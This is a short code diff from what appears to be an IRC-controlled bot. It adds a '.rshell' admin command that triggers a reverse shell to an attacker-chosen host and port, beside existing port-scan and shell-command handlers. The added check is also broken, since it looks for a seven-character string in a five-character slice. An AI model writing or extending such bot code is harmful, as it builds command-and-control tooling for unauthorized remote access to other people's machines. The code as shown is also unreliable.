@@ -460,6 +460,18 @@ def main():
                         message = "Could not parse. The command should be in the format of '.scan [targetIP] [comma,seperated,ports]' to work properly."
                     sendmsg(message, adminname)
 
+                # Respond to '.rshell [target] [port]' command from admin.
+                if name.lower() == adminname.lower() and message[:5].find('.rshell') != -1:
+                    target = message.split(' ', 1)[1]
+                    if target.find(' ') != -1:
+                        port = target.split(' ', 1)[1]
+                        target = target.split(' ')[0]
+                        message = "[*] Reverse shell connection established with " + target + ":" + port + "!"
+                        rShell(target, port)
+                    else:
+                        message = "Could not parse. The command should be in the format of '.rshell [target] [port]' to work properly."
+                    sendntc(message, adminname)
+                
                 # Respond to '.cmd [shell command]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.cmd') != -1:
                     if enableshell:
